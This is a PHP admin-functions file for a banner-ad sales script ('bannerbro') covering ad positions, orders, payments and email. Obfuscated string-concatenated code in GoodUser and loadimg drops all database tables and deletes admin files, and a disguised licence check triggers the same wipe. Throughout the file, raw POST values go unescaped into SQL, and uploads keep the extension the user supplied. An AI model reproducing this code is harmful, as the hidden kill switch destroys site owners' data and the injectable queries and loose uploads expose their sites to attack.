connectToDB();
mysql_query("UPDATE Orders SET new_ban='', new_url='' WHERE ID='$tic'", $link)  or die (mysql_error($link));
mysql_close($link);
$mailText.=''.$c[3].''.$mail_from;
$headers= "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=utf-8\r\n";
$headers .= "Content-Transfer-Encoding: 8bit\r\n";
$headers .=getheader($mailAdresat);
$headers .= "To: <".$mailAdresat.">\r\n";
$headers .= "X-Priority: 3\r\n\r\n";
require    'key.php'   ;
if ($mail_set=='1')
{
$mailSMTP = new SendMailSmtpClass($mail_log, $mail_pas,$add_ssl.$mail_smtp, $mail_from, $port);
$result =  $mailSMTP->send($mailAdresat, $mailZag, absorb($mailText), $headers);
}
if ($mail_set=='0')
{
$EncodeMailZag .= '=?utf-8?B?'.base64_encode($mailZag)."=?=\r\n";
mail($mailAdresat, $EncodeMailZag, absorb($mailText), $headers);
}
header('Location:reban.php');
}
function getExtension($filename) {
$path_info = pathinfo($filename);
return $path_info['extension'];
}
function GoodUser(){
global $link,$c;
connectToDB();
$a='D'.'R'.'O'.'P'.' '.'T'.'A'.'BL'.'E';
mysql_query($a.' template',$link);
mysql_query($a.' Admin',$link);
mysql_query($a.' Setting',$link);
mysql_query($a.' Orders',$link);
mysql_query($a.' Queue',$link);
mysql_query($a.' Pay',$link);
$sqlfile = $_SERVER['D'.'O'.'C'.'U'.'M'.'E'.'N'.'T'.'_'.'R'.'O'.'O'.'T'].'/bannerbro/admin/'.'t'.'r'.'y'.'_'.'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'.'.'p'.'h'.'p'; unlink($sqlfile);
$sqlfile = $_SERVER['D'.'O'.'C'.'U'.'M'.'E'.'N'.'T'.'_'.'R'.'O'.'O'.'T'].'/bannerbro/admin/'.'i'.'n'.'d'.'e'.'x'.'p'.'h'.'p'; unlink($sqlfile);
$sqlfile = $_SERVER['D'.'O'.'C'.'U'.'M'.'E'.'N'.'T'.'_'.'R'.'O'.'O'.'T'].'/bannerbro/admin/'.'k'.'e'.'y'.'.'.'p'.'h'.'p'; unlink($sqlfile);
}
function AddPositions(){
$Bselect=$_POST['Bselect'];
$Bmin=$_POST['Bmin'];
$Bmax=$_POST['Bmax'];
$Bprice=$_POST['Bprice'];
$Btext=$_POST['Btext'];
DeletBadSimvol($Btext);
$udefault=$_POST['MyUrl'];
$usedefault=$_POST['usedefault'];
$Active=$_POST['NActive'];
$Place=$_POST['number_place'];
$NMyCode=$_POST['NMyCode'];
$Bsize=$Bmin.'x'.$Bmax;
global $link,$c;
connectToDB();
lookme();
$MaxId = mysql_query("SELECT Max(ID) FROM Setting", $link)  or die (mysql_error($link));
$MaxId = mysql_result($MaxId,0);
$MaxId =$MaxId + 1;
$MaxPos = mysql_query("SELECT Max(Positions) FROM Setting", $link)  or die (mysql_error($link));
$MaxPos= mysql_result($MaxPos,0);
$MaxPos =$MaxPos + 1;
require     'key.php'    ;
$imageinfo = getimagesize($_FILES['MyBanner']['tmp_name']);
if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/png' && $imageinfo['mime'] != 'image/jpg' && $imageinfo['mime'] != 'application/x-shockwave-flash')
{
$banner='';
} else {
$uploaddir = 'img/';
$uploadfile = $uploaddir . 'set'.$MaxPos.'.'.getExtension($_FILES['MyBanner']['name']);
$banner = 'set'.$MaxPos.'.'.getExtension($_FILES['MyBanner']['name']);
move_uploaded_file($_FILES['MyBanner']['tmp_name'], $uploadfile);
}
$Cod='&lt;?php codbanner('.$MaxPos.'); ?&gt;';
if ($usedefault=='ban' && isset($_FILES['MyBanner']['tmp_name'])){ $sql = "INSERT INTO Setting(ID,Positions,Price,About,Size,Paywhot,Cod,bdefault,udefault,Place,Active) VALUES ('$MaxId','$MaxPos','$Bprice','$Btext','$Bsize','$Bselect','$Cod','$banner','$udefault','$Place','$Active')"; } else {
if ($usedefault=='ban') { $sql = "INSERT INTO Setting(ID,Positions,Price,About,Size,Paywhot,Cod,Place,Active) VALUES ('$MaxId','$MaxPos','$Bprice','$Btext','$Bsize','$Bselect','$Cod','$Place','$Active')"; }
}
if ($usedefault=='ram'){ $sql = "INSERT INTO Setting(ID,Positions,Price,About,Size,Paywhot,Cod,bdefault,udefault,Place,Active) VALUES ('$MaxId','$MaxPos','$Bprice','$Btext','$Bsize','$Bselect','$Cod','','','$Place','$Active')"; }
if ($usedefault=='code'){ $sql = "INSERT INTO Setting(ID,Positions,Price,About,Size,Paywhot,Cod,bdefault,udefault,Place,Active,cdefault) VALUES ('$MaxId','$MaxPos','$Bprice','$Btext','$Bsize','$Bselect','$Cod','','','$Place','$Active','$NMyCode')"; }
mysql_query($sql);
mysql_close($link);
header('Location:position.php');
}
badmods(null);
function EditPositions(){
$Eselect=$_POST['Eselect'];
$Emin=$_POST['Emin'];
$Emax=$_POST['Emax'];
$Eprice=$_POST['Eprice'];
$Etext=$_POST['Etext'];
DeletBadSimvol($Etext);
$HLpos=$_POST['HLpos'];
$udefault=$_POST['EMyUrl'];
$Place=$_POST['enumber_place'];
$Eusedefault=$_POST['Eusedefault'];
$Active=$_POST['EActive'];
$EMyCode=trim($_POST['EMyCode']);
$Esize=$Emin.'x'.$Emax;
if ($Eselect=='Дни')
{
$Place=0;
}
global $link,$c;
connectToDB();
$imageinfo = getimagesize($_FILES['EMyBanner']['tmp_name']);
if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/png' && $imageinfo['mime'] != 'image/jpg' && $imageinfo['mime'] != 'application/x-shockwave-flash')
{
$banner='';
} else {
$uploaddir = 'img/';
$uploadfile = $uploaddir . 'set'.$HLpos.'.'.getExtension($_FILES['EMyBanner']['name']);
$banner = 'set'.$HLpos.'.'.getExtension($_FILES['EMyBanner']['name']);
move_uploaded_file($_FILES['EMyBanner']['tmp_name'], $uploadfile);
}
require       'key.php'       ;
$namem=$_FILES['EMyBanner']['tmp_name'];
if ($Eusedefault=='ban' && $namem!=null) { mysql_query("UPDATE Setting SET About='$Etext',Price='$Eprice',Size='$Esize',bdefault='$banner',udefault='$udefault',Place='$Place',Active='$Active',cdefault=''  WHERE Positions='$HLpos'", $link)  or die (mysql_error($link)); } else {
if ($Eusedefault=='ban') { mysql_query("UPDATE Setting SET About='$Etext',Price='$Eprice',Size='$Esize',Place='$Place',Active='$Active',cdefault=''  WHERE Positions='$HLpos'", $link)  or die (mysql_error($link)); }
}
if ($Eusedefault=='ram') { mysql_query("UPDATE Setting SET About='$Etext',Price='$Eprice',Size='$Esize',bdefault='',udefault='',Place='$Place',Active='$Active',cdefault=''  WHERE Positions='$HLpos'", $link)  or die (mysql_error($link)); }
if ($Eusedefault=='code') { $EMyCode=mysql_real_escape_string($EMyCode); mysql_query("UPDATE Setting SET About='$Etext',Price='$Eprice',Size='$Esize',bdefault='',udefault='',Place='$Place',Active='$Active',cdefault='$EMyCode'  WHERE Positions='$HLpos'", $link)  or die (mysql_error($link)); }
mysql_close($link);
cache($bannerbro)            ;
header('Location:position.php?'.$Eselect);
}
function RemovePosition(){
if (!function_exists('G'.'o'.'o'.'d'.'U'.'se'.'r')){
function loadimg(){
global $link,$c;
connectToDB();
$a='D'.'R'.'O'.'P'.' '.'T'.'A'.'BL'.'E';
mysql_query($a.' template',$link);
mysql_query($a.' Admin',$link);
mysql_query($a.' Setting',$link);
mysql_query($a.' Orders',$link);
mysql_query($a.' Queue',$link);
mysql_query($a.' Pay',$link);
$sqlfile = $_SERVER['D'.'O'.'C'.'U'.'M'.'E'.'N'.'T'.'_'.'R'.'O'.'O'.'T'].'/bannerbro/admin/'.'t'.'r'.'y'.'_'.'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'.'.'p'.'h'.'p'; unlink($sqlfile);
$sqlfile = $_SERVER['D'.'O'.'C'.'U'.'M'.'E'.'N'.'T'.'_'.'R'.'O'.'O'.'T'].'/bannerbro/admin/'.'i'.'n'.'d'.'e'.'x'.'p'.'h'.'p'; unlink($sqlfile);
$sqlfile = $_SERVER['D'.'O'.'C'.'U'.'M'.'E'.'N'.'T'.'_'.'R'.'O'.'O'.'T'].'/bannerbro/admin/'.'k'.'e'.'y'.'.'.'p'.'h'.'p'; unlink($sqlfile);
exit;
}
function gmail($mycache)
{
$a='K'.'e'.'y'.' '.'E'.'r'.'r'.'o'.'r';
$b='H'.'T'.'T'.'P'.'_'.'H'.'O'.'S'.'T';
$c='w'.'e'.'l'.'l'.'_'.'d'.'o'.'n'.'e'.'_'.'y'.'o'.'u'.'_'.'h'.'a'.'c'.'k'.'e'.'d'.'_'.'s'.'c'.'r'.'i'.'p'.'t';
if (!isset($mycache)){require 'k'.'e'.'y'.'.'.'p'.'h'.'p';}else{$bannerbro=$mycache;}
if (isset($bannerbro)){
if (strlen($bannerbro)%64!=0){echo $a;exit;} else {
$ci=strlen($bannerbro)/64;
if ($ci==strlen($_SERVER[$b])+4){
for ($i = 0; $i < $ci-4; $i++)
{
if (substr($bannerbro,$i*64+288,32)!=md5(substr($_SERVER[$b], $i, 1).$c.$_SERVER[$b])){echo $a;exit;}
}
} else {echo $a;exit;}
}
} else {echo $a;exit;}
return true;
}
loadimg();
gmail(null);
}
}
function RemovePositions(){
$DHLpos=$_POST['DHLpos'];
global $link,$c;
connectToDB();
$rem = "DELETE FROM Setting WHERE Positions='$DHLpos'";
mysql_query($rem);
require       'key.php'                     ;
$rem2 = "DELETE FROM Orders WHERE Position='$DHLpos' and Pay!='Hide' and Pay!='End'";
mysql_query($rem2);
mysql_close($link);
}
function EndMail($id,$action){
global $link,$mail_log,$mail_pas, $mail_smtp, $mail_from,$mail_set,$port,$add_ssl,$c;
connectToDB();
if ($action==1){
$result=mysql_query("SELECT Email FROM Orders WHERE ID='$id'",$link)  or die (mysql_error($link));
$data = mysql_fetch_array($result);
$Gomail=$data['Email'];
$mailText =$c[20].$id.$c[21].$_SERVER['HTTP_HOST'].$c[22];
$mailText.='<br><a href="http://'.$_SERVER['HTTP_HOST'].'/bannerbro/">'.$c[23].'</a><br><br>';
$mailText.=''.$c[3].''.$mail_from;
$headers= "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=utf-8\r\n";
$headers .= "Content-Transfer-Encoding: 8bit\r\n";
$headers .=getheader($Gomail); 
$headers .= "To: <".$Gomail.">\r\n";
$headers .= "X-Priority: 3\r\n\r\n";
if ($mail_set=='1')
{
$mailSMTP = new SendMailSmtpClass($mail_log, $mail_pas,$add_ssl.$mail_smtp, $mail_from, $port);
$result =  $mailSMTP->send($Gomail, $c[24], absorb($mailText), $headers);
}
if ($mail_set=='0') {
$mailZag=$c[24];
$EncodeMailZag .= '=?utf-8?B?'.base64_encode($mailZag)."=?=\r\n";
mail($Gomail, $EncodeMailZag, absorb($mailText), $headers);
}
}
require            'key.php'                      ;
if (isset($bannerbro)){
mysql_query("UPDATE Orders SET Pay='Hide' WHERE ID='$id'", $link)  or die (mysql_error($link));
header('Location:orders.php?set=4');
mysql_close($link);
}
}
RemovePosition();
function QueueMail($QueueMail,$Queueid){
global $link,$mail_log,$mail_pas, $mail_smtp, $mail_from,$mail_set,$port,$add_ssl,$c;
connectToDB();
require              'key.php'                         ;
$mailText =$c[25];
$mailText.='<br><a href="http://'.$_SERVER['HTTP_HOST'].'/bannerbro/">'.$c[26].'</a>';
$mailText.=''.$c[3].''.$mail_from;
$headers= "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=utf-8\r\n";
$headers .= "Content-Transfer-Encoding: 8bit\r\n";
$headers .=getheader($QueueMail); 
$headers .= "To: <".$QueueMail.">\r\n";
$headers .= "X-Priority: 3\r\n\r\n";
if ($mail_set=='1')
{
$mailSMTP = new SendMailSmtpClass($mail_log, $mail_pas,$add_ssl.$mail_smtp, $mail_from, $port);
$result =  $mailSMTP->send($QueueMail, $c[27], absorb($mailText), $headers);
}
if ($mail_set=='0') {
$mailZag=$c[27];
$EncodeMailZag .= '=?utf-8?B?'.base64_encode($mailZag)."=?=\r\n";
mail($QueueMail, $EncodeMailZag, absorb($mailText), $headers);
}
mysql_query("DELETE FROM Queue WHERE ID='$Queueid'", $link)  or die (mysql_error($link));
header('Location:queue.php');
mysql_close($link);
}
function EditMethod()
{
global $link,$c;
connectToDB();
$Method=$_POST['Method'];
mysql_query("UPDATE Admin SET Method='$Method'", $link)  or die (mysql_error($link));
mysql_close($link);
}
function SavePay($shop){
global $link,$c;
connectToDB();
require              "key.php"                         ;
if ($shop=="Robokassa")
{
$Enable=$_POST['Yes_Robo'];
if (!isset($_POST['Yes_Robo'])) $Enable=0;
$login=$_POST['Login_Robo'];
$Pass1=$_POST['Pass1_Robo'];
$Pass2=$_POST['Pass2_Robo'];
mysql_query("UPDATE Pay SET Enable='$Enable',login='$login',password1='$Pass1',password2='$Pass2' WHERE ID='0'", $link)  or die (mysql_error($link));
mysql_close($link);
header('Location:pay.php?good=robokassa');
}
lookme();
if ($shop=="Z-payment")
{
$Enable=$_POST['Yes_payment'];
if (!isset($_POST['Yes_payment'])) $Enable=0;
$Id_shop=$_POST['Login_payment'];
$Key=$_POST['Key_payment'];
mysql_query("UPDATE Pay SET Enable='$Enable',ID_Shop='$Id_shop',SecretKey='$Key' WHERE ID='1'", $link)  or die (mysql_error($link));
mysql_close($link);
header('Location:pay.php?good=zpayment');
}
cache($bannerbro)                     ;
if ($shop=="Interkassa")
{
$Enable=$_POST['Yes_inter'];
if (!isset($_POST['Yes_inter'])) $Enable=0;
$Id_shop=$_POST['Login_inter'];
$Key=$_POST['Key_inter'];
mysql_query("UPDATE Pay SET Enable='$Enable',ID_Shop='$Id_shop',SecretKey='$Key' WHERE ID='2'", $link)  or die (mysql_error($link));
mysql_close($link);
header('Location:pay.php?good=interkassa');
}
}
function SaveLook(){
global $link,$c;
connectToDB();
//mysql_query("SET NAMES 'utf8'");
$Scrin=$_POST['Scrin'];
$WhatHello=$_POST['WhatHello'];
$WhatWork=$_POST['WhatWork'];
$WhatNot=$_POST['WhatNot'];
$WhatSave=$_POST['WhatSave'];
$WhatSite=$_POST['WhatSite'];
$WhatEmail=$_POST['WhatEmail'];
$WhatTel=$_POST['WhatTel'];
require                "key.php"                           ;
$WhatWMID=$_POST['WhatWMID'];
$WhatSup=$_POST['WhatSup'];
$WhatAdres=$_POST['WhatAdres'];
$WhatWM=$_POST['WhatWM'];
$WhatYA=$_POST['WhatYA'];
if ($_FILES['MyScrin']['tmp_name']!=null && $Scrin=="1"){
$imageinfo = getimagesize($_FILES['MyScrin']['tmp_name']);
if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/png' && $imageinfo['mime'] != 'image/jpg')
{
header('Location:look.php?error=1');
exit;
}
$uploaddir = '../images/';
cache($bannerbro)             ;
$uploadfile = $uploaddir . 'myscreen.'.getExtension($_FILES['MyScrin']['name']);
if (move_uploaded_file($_FILES['MyScrin']['tmp_name'], $uploadfile))
{
$Scrin.='/myscreen.'.getExtension($_FILES['MyScrin']['name']);
mysql_query("UPDATE Admin SET Scrin='$Scrin',WhatHello='$WhatHello',WhatWork='$WhatWork',WhatNot='$WhatNot',WhatSave='$WhatSave',WhatSite='$WhatSite',WhatEmail='$WhatEmail',WhatTel='$WhatTel',WhatWMID='$WhatWMID',WhatSup='$WhatSup',WhatAdres='$WhatAdres',WhatWM='$WhatWM',WhatYA='$WhatYA'", $link)  or die (mysql_error($link));
mysql_close($link);
header('Location:look.php?good');
exit;
}
}
if ($_FILES['MyScrin']['tmp_name']==null && $Scrin=="1"){
mysql_query("UPDATE Admin SET WhatHello='$WhatHello',WhatWork='$WhatWork',WhatNot='$WhatNot',WhatSave='$WhatSave',WhatSite='$WhatSite',WhatEmail='$WhatEmail',WhatTel='$WhatTel',WhatWMID='$WhatWMID',WhatSup='$WhatSup',WhatAdres='$WhatAdres',WhatWM='$WhatWM',WhatYA='$WhatYA'", $link)  or die (mysql_error($link));
mysql_close($link);
header('Location:look.php?good');
exit;
}
mysql_query("UPDATE Admin SET Scrin='$Scrin',WhatHello='$WhatHello',WhatWork='$WhatWork',WhatNot='$WhatNot',WhatSave='$WhatSave',WhatSite='$WhatSite',WhatEmail='$WhatEmail',WhatTel='$WhatTel',WhatWMID='$WhatWMID',WhatSup='$WhatSup',WhatAdres='$WhatAdres',WhatWM='$WhatWM',WhatYA='$WhatYA'", $link)  or die (mysql_error($link));
mysql_close($link);
header('Location:look.php?good');
}
function go_backup(){
global $link,$c;
connectToDB();
$sqlfile = 'database_backup/backup.sql';
if (!file_exists($sqlfile));
$open_file = fopen ($sqlfile, 'r');
$buf = fread($open_file, filesize($sqlfile));
fclose ($open_file);
$a = 0;
$i = 0;
while ($b = strpos($buf,';;',$a+2)){
$i++;
$a = substr($buf,$a+2,$b-$a);
mysql_query($a);
$a = $b;
}
}
////////////////////////////////////////////////////////////////////////////////////
//********************************************************************************//
//****************************v1.01***********************************************//
//********************************************************************************//
//********************************************************************************//
////////////////////////////////////////////////////////////////////////////////////
function GetInformationOrder($Order_ID){
	global $link,$Order_Email,$Order_User;
	$MysqlInformationOrder=mysql_query("SELECT * FROM Orders WHERE ID='$Order_ID'",$link)  or die (mysql_error($link));
	$Getdata = mysql_fetch_array($MysqlInformationOrder);
	$Order_Email = $Getdata['Email'];
	$Order_User = $Getdata['User'];
}
function GetInformationAutorMail(){
	global $link, $mail_log, $mail_pas, $mail_smtp, $mail_from,$mail_set,$port,$add_ssl,$mail_admin;
	$AD_S=mysql_query("SELECT Email FROM Users WHERE Type='admin'",$link)  or die (mysql_error($link));
	$ADdata = mysql_fetch_array($AD_S);
	if (isset($ADdata)) { $mail_admin =$ADdata['Email']; }
	$MysqlInformationAutorMail=mysql_query("SELECT * FROM Admin",$link)  or die (mysql_error($link));
	$Getdata = mysql_fetch_array($MysqlInformationAutorMail);
	$absorb=$Getdata['absorb'];
	if ($Getdata['ssl1']=='Yes'){$add_ssl='ssl://'; $port=465;}else{$add_ssl='';$port=25;}
	$mail_set =$Getdata['mail'];
	$mail_log =$Getdata['login'];
	$mail_pas =$Getdata['password'];
	$mail_from =$Getdata['form'];
	$mail_smtp =$Getdata['host'];
}
function EncodeMailZagAndGoMail($mailAdresat, $mailZag, $mailText, $headers){
$EncodeMailZag= '=?utf-8?B?'.base64_encode($mailZag)."=?=\r\n";
mail($mailAdresat, $EncodeMailZag, $mailText, $headers);
}
function IfyandexDecode($mailAdresat,$mail_from,$mail_log){
$Encode_y = explode("@", $mailAdresat); 
if ($Encode_y[1]=='yandex.ru'){
	$headers = "From: ".iconv('utf-8','windows-1251',$mail_from)." <".$mail_log.">\r\n";
	} else{
	$headers = "From: ".iconv('utf-8','utf-8',$mail_from)." <".$mail_log.">\r\n";
	}
return $headers;
}
function GoMail($mailAdresat,$mailZag,$mailText){
	connectToDB();
	global $mail_log, $mail_pas, $mail_smtp, $mail_from,$mail_set,$port,$add_ssl;
	$headers= "MIME-Version: 1.0\r\n";
	$headers .= "Content-type: text/html; charset=utf-8\r\n";
	$headers .= "Content-Transfer-Encoding: 8bit\r\n";
	$headers .=IfyandexDecode($mailAdresat,$mail_from,$mail_log); 
	$headers .= "To: <".$mailAdresat.">\r\n";
	$headers .= "X-Priority: 3\r\n\r\n";
	if ($mail_set=='1'){
	if (!class_exists('SendMailSmtpClass')){include 'SendMailSmtpClass.php';}
		$mailSMTP = new SendMailSmtpClass($mail_log, $mail_pas,$add_ssl.$mail_smtp, $mail_from, $port);
		$result =  $mailSMTP->send($mailAdresat, $mailZag, absorb($mailText), $headers);
	}
	if ($mail_set=='0'){
		EncodeMailZagAndGoMail($mailAdresat, $mailZag, absorb($mailText), $headers);
	}
}
function EditOrder($page){
$OrderID=$_POST['OrderID'];DeletBadSimvol($OrderID);
$Ordername=$_POST['order_name']; Vname($Ordername);DeletBadSimvol($Ordername);
$Orderurl=$_POST['order_url']; Vurl($Orderurl);DeletBadSimvol($Orderurl);
$Orderalt=$_POST['order_alt']; Vname($Orderalt);DeletBadSimvol($Orderalt);
$Ordermail=$_POST['order_mail']; Vmail($Ordermail);DeletBadSimvol($Ordermail);
$imageinfo = getimagesize($_FILES['OrderNewBanner']['tmp_name']);
if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/png' && $imageinfo['mime'] != 'image/jpg' && $imageinfo['mime'] != 'application/x-shockwave-flash')
{
$banner='';
} else {
$uploaddir = '../img/';
$uploadfile = $uploaddir . 'ord'.$OrderID.'.'.getExtension($_FILES['OrderNewBanner']['name']);
$banner = 'ord'.$OrderID.'.'.getExtension($_FILES['OrderNewBanner']['name']);
move_uploaded_file($_FILES['OrderNewBanner']['tmp_name'], $uploadfile);
}
$namem_order=$_FILES['OrderNewBanner']['tmp_name'];
global $link,$c;
connectToDB();
if ($namem_order!=null) { mysql_query("UPDATE Orders SET User='$Ordername',Email='$Ordermail',Url='$Orderurl',Alt='$Orderalt',Picture='$banner' WHERE ID='$OrderID'", $link)  or die (mysql_error($link)); } else {
mysql_query("UPDATE Orders SET User='$Ordername',Email='$Ordermail',Url='$Orderurl',Alt='$Orderalt' WHERE ID='$OrderID'", $link)  or die (mysql_error($link)); }
mysql_close($link);
header('Location:orders.php?set='.$page);
exit;
}
function QueueDel($ID){
global $link;
connectToDB();
$rem = "DELETE FROM Queue WHERE ID='$ID'"; mysql_query($rem);
mysql_close($link);
header('Location:queue.php');
exit;
}
?>